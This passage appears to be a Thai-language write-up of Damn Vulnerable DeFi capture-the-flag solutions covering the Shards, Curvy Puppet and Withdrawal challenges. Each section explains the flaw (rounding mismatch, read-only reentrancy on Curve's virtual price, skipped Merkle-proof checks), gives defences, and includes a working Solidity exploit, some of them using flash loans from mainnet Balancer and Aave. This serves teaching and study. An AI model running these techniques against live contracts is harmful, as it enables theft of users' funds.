            vault.sweepFunds.selector,
            recovery,
            token
        );
        uint256 actionDataLengthValue = sweepFundsCalldata.length;
        bytes memory actionDataLength = abi.encodePacked(uint256(actionDataLengthValue));

        bytes memory calldataPayload = abi.encodePacked(
            executeSelector,
            target,
            dataOffset,
            emptyData,
            withdrawSelectorPadded,
            actionDataLength,
            sweepFundsCalldata
        );

        return calldataPayload;
    }
}
```

## 16. Shards
marketplace ที่ขาย "shards" (ส่วนแบ่ง) ของ NFT เป็น DVT แต่มีช่องโหว่ เพราะตอนจ่ายเงินกับตอนคืนเงินปัดเศษไม่เหมือนกัน
### เป้าหมาย :
- ดึง DVT ออกจาก marketplace (มากกว่า 0.01%) แล้วส่งทั้งหมดไป recovery
- ยอดเงินใน staking contract ต้องไม่เปลี่ยน
- ใช้แค่ 1 ทรานแซกชัน
### ช่องโหว่ :
- `fill()` คิดเงินด้วยสูตร `want * _toDVT(price, rate) / totalShards` ซึ่งปัดลง ซื้อ 100 shards เลยจ่าย 0 DVT (100 * 75e21 / 1e25 = 0.75 → 0)
- `cancel()` คืนเงินด้วยอีกสูตรคือ `shards * rate / 1e6` ซึ่งปัดขึ้น ได้ DVT คืนประมาณ 7.5e12 wei ต่อ 100 shards
- เงื่อนไขเช็คเวลาใน `cancel()` เขียนกลับด้าน เลยยกเลิกได้ทันทีใน block เดียวกับที่ซื้อ
### วิธีโจมตี :
- วน fill 100 shards → cancel 10001 รอบใน exploit contract (จะได้จบใน 1 ทรานแซกชัน) แล้วส่งกำไรไป recovery
### การป้องกัน :
- ปัดเศษให้สอดคล้องกันและเข้าข้างโปรโตคอลเสมอ (ปัดเงินที่เก็บขึ้น, ปัดเงินคืนลง), reject การ fill ที่ราคาเป็น 0 และแก้เงื่อนไขเช็คเวลาที่กลับด้านใน `cancel()`
### POC
```solidity
function test_shards() public checkSolvedByPlayer {
    Exploit exploit = new Exploit(marketplace, token, recovery);
    exploit.attack(1);
}

contract Exploit {
    function attack(uint64 offerId) external {
        uint256 wantShards = 100;
        for (uint256 i = 0; i < 10001; i++) {
            marketplace.fill(offerId, wantShards);
            marketplace.cancel(1, i);
        }
        token.transfer(recovery, token.balanceOf(address(this)));
    }
}
```

## 17. Curvy Puppet
สัญญา lending ที่ให้ผู้ใช้ยืม LP token ของ Curve stETH/ETH โดยใช้ DVT เป็นหลักประกัน แต่มีช่องโหว่ read-only reentrancy ที่ `get_virtual_price()` ของ Curve
### เป้าหมาย :
- ปิด position ของผู้ใช้ทั้ง 3 คน (alice/bob/charlie) ในสัญญา lending ให้หมด (ทั้ง collateral และ borrow ต้องเป็น 0)
- treasury ต้องยังมี WETH และ LP เหลืออยู่บ้าง และต้องได้ DVT ของผู้ใช้ทั้ง 3 คนครบ (7500)
- player ต้องไม่เหลืออะไรเลย
### ช่องโหว่ :
- สัญญา lending ตีราคา borrow asset (LP token ของ Curve stETH/ETH) ด้วยสูตร `ETH_price * get_virtual_price()` ส่วน `remove_liquidity` ของ Curve pool รุ่นเก่าจะ burn LP supply ก่อน แล้วค่อย raw-call ส่ง ETH กลับให้ผู้เรียก **ก่อน** ที่ balance ของ pool จะอัปเดตเสร็จ ทำให้ `get_virtual_price()` อ่านค่าที่สูงเกินจริงในช่วง callback ที่รับ ETH นั้น (read-only reentrancy: การเรียกกลับเข้าไปในฟังก์ชัน *view* ทั้งที่ state ของ contract ยังอัปเดตไม่เสร็จ)
- เพราะ LP token คือ *borrow asset* ของผู้ใช้ ราคา LP ที่พองขึ้นเลยทำให้มูลค่าหนี้ของทุกคนพองตาม ดัน position ทั้ง 3 อันที่เดิมมีหลักประกันเกินพอ ให้กลายเป็น liquidate ได้
- liquidate ได้เมื่อ `collateralValue*100 < borrowValue*175` โดย collateral = 2500 DVT ราคา $10 และ borrow = 1 LP จึงต้องดัน `virtual_price` ให้เกิน 3.5714e18 (ค่าปกติอยู่ที่ ~1.1e18) (อยู่ใน `CurvyPuppetLending.sol`)
### วิธีโจมตี :
- กู้ flash loan WETH+wstETH จาก Balancer (วงนอก ไม่มีค่าธรรมเนียม) และ Aave (วงใน) → unwrap/withdraw เป็น ETH+stETH → `add_liquidity` ก้อนใหญ่มากโดยจงใจใส่ stETH เยอะ (ยิ่ง stETH เยอะ ราคายิ่งพุ่ง) → `remove_liquidity` → ตอนที่ ETH เข้ามาใน `receive()` virtual_price ถูกปั่นขึ้นไปแล้ว จึงเรียก `liquidate()` ผู้ใช้ทั้ง 3 คนได้ (จ่าย 1 LP ต่อคนจาก 6.5 LP ของ treasury และได้ 2500 DVT ต่อคน)
- การคืนเงินกู้: เพราะฝากโดยใส่ ETH น้อย ตอนถอนจึงได้ ETH เยอะ / stETH น้อย ทำให้มี ETH เกินและขาด wstETH ในมูลค่าใกล้เคียงกัน จึงกัน WETH ที่ต้องจ่ายไว้ก่อน แล้วแปลง ETH ที่เหลือเป็น stETH ผ่าน Lido (เก็บ reserve ไว้นิดหน่อยให้ treasury ยังมี WETH) แล้ว wrap ให้ได้ wstETH ครบตามที่ต้องคืน ต้นทุนหลักคือค่าธรรมเนียม Aave ~0.05% ซึ่งถูกหักจากเงินสำรอง 200 WETH ของ treasury จึงต้องกู้ wstETH ไม่ให้เยอะเกินไป
### การป้องกัน :
- อย่าอ่าน `get_virtual_price()` (หรือ state ใด ๆ ของ pool) ในจังหวะที่ยังส่ง control ให้ผู้เรียกที่ไว้ใจไม่ได้ — ใช้ oracle ที่ปั่นราคายาก หรือใส่ reentrancy lock ให้กับ view (ต่อมา Curve ได้เพิ่มการป้องกัน reentrancy ให้ `remove_liquidity`) และอย่าตีราคาสินทรัพย์ที่ให้กู้จาก virtual price ณ จุดเดียว
### POC
```solidity
function test_curvyPuppet() public checkSolvedByPlayer {
    Exploit exploit = new Exploit(
        lending, curvePool, oracle, dvt, stETH, weth, treasury, [alice, bob, charlie]
    );
    weth.transferFrom(treasury, address(exploit), TREASURY_WETH_BALANCE);
    IERC20(curvePool.lp_token()).transferFrom(treasury, address(exploit), TREASURY_LP_BALANCE);
    exploit.run();
}

contract Exploit {
    IBalancerVault constant balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    address constant aavePool = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2;
    IWstETH constant wstETH = IWstETH(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0);
    IPermit2 constant permit2 = IPermit2(0x000000000022D473030F116dDEE9F6B43aC78BA3);

    // Balancer <= ~37,991 WETH / ~12,597 wstETH ; Aave <= ~83,192 WETH / ~1,036,780 wstETH
    uint256 constant BAL_WETH   = 37_000e18;
    uint256 constant BAL_WSTETH = 12_000e18;
    // stETH เยอะ: ปรับให้ virtual_price เกิน ~3.5714e18 (threshold ของการ liquidate)
    uint256 constant AAVE_WETH   = 83_000e18;
    uint256 constant AAVE_WSTETH = 140_000e18;
    uint256 constant ETH_RESERVE = 20e18; // ETH ที่กันไว้ให้ treasury ยังมี WETH > 0

    // ... immutables + constructor เก็บ lending/curvePool/oracle/dvt/stETH/weth/treasury/lpToken/users
    enum State { NONE, LIQUIDATING }
    State state;

    function run() external {
        // OUTER loan: Balancer (เรียง token น้อยไปมาก: wstETH < WETH)
        address[] memory tokens = new address[](2);
        uint256[] memory amounts = new uint256[](2);
        tokens[0] = address(wstETH); tokens[1] = address(weth);
        amounts[0] = BAL_WSTETH;     amounts[1] = BAL_WETH;
        balancer.flashLoan(address(this), tokens, amounts, "");

        // คืนทุกอย่างให้ treasury
        weth.deposit{value: address(this).balance}();
        dvt.transfer(treasury, dvt.balanceOf(address(this)));            // 7500 DVT
        weth.transfer(treasury, weth.balanceOf(address(this)));          // WETH > 0
        IERC20(lpToken).transfer(treasury, IERC20(lpToken).balanceOf(address(this))); // LP > 0
    }

    function receiveFlashLoan(address[] memory, uint256[] memory, uint256[] memory, bytes memory) external {
        require(msg.sender == address(balancer), "not balancer");
        // INNER loan: Aave (ทั้งสอง asset), modes [0,0] = คืนเต็มจำนวน
        address[] memory assets = new address[](2);
        uint256[] memory amts = new uint256[](2);
        uint256[] memory modes = new uint256[](2);
        assets[0] = address(weth);  assets[1] = address(wstETH);
        amts[0] = AAVE_WETH;        amts[1] = AAVE_WSTETH;
        (bool ok,) = aavePool.call(abi.encodeWithSignature(
            "flashLoan(address,address[],uint256[],uint256[],address,bytes,uint16)",
            address(this), assets, amts, modes, address(this), bytes(""), uint16(0)));
        require(ok, "aave flashloan failed");
        // คืน Balancer (ไม่มีค่าธรรมเนียม)
        IERC20(address(weth)).transfer(address(balancer), BAL_WETH);
        IERC20(address(wstETH)).transfer(address(balancer), BAL_WSTETH);
    }

    function executeOperation(address[] calldata, uint256[] calldata, uint256[] calldata premiums,
        address initiator, bytes calldata) external returns (bool) {
        require(msg.sender == aavePool && initiator == address(this));
        // 1) แปลง token ที่กู้มาทั้งหมด -> coin ของ pool (ETH + stETH)
        weth.withdraw(IERC20(address(weth)).balanceOf(address(this)));
        wstETH.unwrap(IERC20(address(wstETH)).balanceOf(address(this)));
        stETH.approve(address(curvePool), type(uint256).max);
        // 2) add liquidity ก้อนใหญ่ (stETH เยอะ)
        uint256 stEthAmount = stETH.balanceOf(address(this));
        uint256 ethForLp = address(this).balance;
        uint256 lpMinted = curvePool.add_liquidity{value: ethForLp}([ethForLp, stEthAmount], 0);
        // 3) ให้ lending ดึง LP ของเราตอน liquidate()
        IERC20(lpToken).approve(address(permit2), type(uint256).max);
        permit2.approve(lpToken, address(lending), type(uint160).max, uint48(block.timestamp + 1));
        // 4) remove -> pool raw-call ส่ง ETH เข้า receive() -> ช่วง liquidate
        state = State.LIQUIDATING;
        curvePool.remove_liquidity(lpMinted, [uint256(0), uint256(0)]);
        state = State.NONE;
        // 5) ใช้หนี้: ETH ส่วนเกิน -> stETH -> wstETH เพื่อชดเชยส่วนที่ขาด
        uint256 wethOwed   = AAVE_WETH + premiums[0] + BAL_WETH;
        uint256 wstethOwed = AAVE_WSTETH + premiums[1] + BAL_WSTETH;
        weth.deposit{value: wethOwed}();
        uint256 ethBal = address(this).balance;
        if (ethBal > ETH_RESERVE) {
            (bool ok,) = address(stETH).call{value: ethBal - ETH_RESERVE}(
                abi.encodeWithSignature("submit(address)", address(0)));
            require(ok, "lido submit failed");
        }
        stETH.approve(address(wstETH), type(uint256).max);
        wstETH.wrap(stETH.balanceOf(address(this)));
        require(IERC20(address(wstETH)).balanceOf(address(this)) >= wstethOwed, "wsteth short");
        IERC20(address(weth)).approve(aavePool, AAVE_WETH + premiums[0]);
        IERC20(address(wstETH)).approve(aavePool, AAVE_WSTETH + premiums[1]);
        return true;
    }

    receive() external payable {
        if (state != State.LIQUIDATING) return;
        // virtual_price ถูกปั่นขึ้นแล้ว (read-only reentrancy) -> liquidate ได้ทุก position
        for (uint256 i = 0; i < users.length; i++) lending.liquidate(users[i]);
    }
}
```

## 18. Withdrawal
bridge token จาก L2→L1 ที่ gateway finalize withdrawal จาก log ของ L2 ที่พิสูจน์ด้วย Merkle proof แต่มีช่องโหว่ให้ operator ข้ามการตรวจ proof ได้ และไม่สนว่า call ล้มเหลว
### เป้าหมาย :
- ต้อง finalize withdrawal ทั้ง 4 รายการในชุดที่โจทย์ให้ (รวมรายการที่น่าสงสัยด้วย) ที่ L1 gateway (counter >= 4)
- token bridge เสียเงินได้บ้าง แต่ต้องน้อยกว่า 1%
- player ต้องเหลือ token เป็น 0
### ช่องโหว่ :
- `L1Gateway.finalizeWithdrawal()` ให้คนที่มี `OPERATOR_ROLE` (ซึ่งก็คือ player) finalize withdrawal ได้โดยใช้ **Merkle proof ว่างเปล่า**
- ฟังก์ชันนี้ mark leaf ว่า finalized และเพิ่ม counter **ก่อน** เรียก external call แล้ว **ไม่สนว่า call นั้นสำเร็จหรือไม่** withdrawal จึงถูก "finalize" ได้ทั้งที่การโอน token ล้มเหลว
- ใน withdrawal 4 รายการ มี 3 รายการที่ถูกต้อง (โอนรายการละ 10 DVT) และมี 1 รายการ (index 2) ที่เป็นอันตราย ดึงออกไป 999,000 DVT จนทำให้ bridge หมดตัว
### วิธีโจมตี :
- delay 7 วันใช้กับ operator ด้วย จึงใช้ `vm.warp` ข้ามไป แล้วทำในฐานะ operator โดย replay payload จาก `withdrawals.json` ตามจริง:
  1. finalize 3 รายการที่ถูกต้อง
  2. finalize รายการที่เรา **สร้างขึ้นเอง** เพื่อดึง 999,000 DVT ออกมาที่ player ทำให้ bridge ว่างเปล่า
  3. finalize รายการอันตราย ตอนนี้ `TokenBridge.executeTokenWithdrawal` จะทำ `totalDeposits -= 999_000e18` ซึ่ง **underflow แล้ว revert** leaf จึงถูกบันทึกว่า finalized แต่ไม่มี token ขยับเลย
  4. โอน 999,000 DVT คืนเข้า bridge (player เหลือ 0)
### การป้องกัน :
- ไม่ให้ role พิเศษข้ามการตรวจ proof ได้, ตรวจให้แน่ว่า message ทำงานสำเร็จจริงก่อน mark ว่า finalized (เช็คค่า return / การ revert ของ call), และตั้งเพดานจำนวนเงินต่อ withdrawal จะได้ไม่มี message เดียวที่ดึงเงินออกจาก bridge ได้หมด
### POC
```solidity
function test_withdrawal() public checkSolvedByPlayer {
    vm.warp(block.timestamp + l1Gateway.DELAY() + 1 days);
    bytes32[] memory noProof = new bytes32[](0);
    string memory logs = vm.readFile("test/withdrawal/withdrawals.json");

    // 1) finalize 3 รายการที่ถูกต้อง (10 DVT ต่อรายการ)
    _finalizeLog(logs, 0, noProof);
    _finalizeLog(logs, 1, noProof);
    _finalizeLog(logs, 3, noProof);

    // 2) ดึงเงินออกจาก bridge ไปที่ player ด้วย withdrawal ที่เราสร้างเองในฐานะ operator
    uint256 drain = 999_000e18;
    bytes memory inner = abi.encodeWithSignature("executeTokenWithdrawal(address,uint256)", player, drain);
    bytes memory fwd = abi.encodeWithSignature(
        "forwardMessage(uint256,address,address,bytes)", uint256(1000), player, address(l1TokenBridge), inner
    );
    l1Gateway.finalizeWithdrawal(1000, l2Handler, address(l1Forwarder), START_TIMESTAMP, fwd, noProof);

    // 3) finalize รายการอันตราย -> การโอนข้างในเจอ underflow revert แต่ยังถูก finalize
    _finalizeLog(logs, 2, noProof);

    // 4) คืน token ที่ดึงมากลับไป (player เหลือ 0)
    token.transfer(address(l1TokenBridge), drain);
}

// replay log ของ L2 withdrawal ผ่าน finalizeWithdrawal (operator, ไม่ต้องใช้ proof)
// log data = abi.encode(bytes32 id, uint256 timestamp, bytes message); topics[1]=nonce
function _finalizeLog(string memory logs, uint256 i, bytes32[] memory noProof) private {
    string memory base = string.concat("[", vm.toString(i), "]");
    uint256 nonce = uint256(vm.parseJsonBytes32(logs, string.concat(base, ".topics[1]")));
    bytes memory data = vm.parseJsonBytes(logs, string.concat(base, ".data"));
    (, uint256 timestamp, bytes memory message) = abi.decode(data, (bytes32, uint256, bytes));
    l1Gateway.finalizeWithdrawal(nonce, l2Handler, address(l1Forwarder), timestamp, message, noProof);
}
```
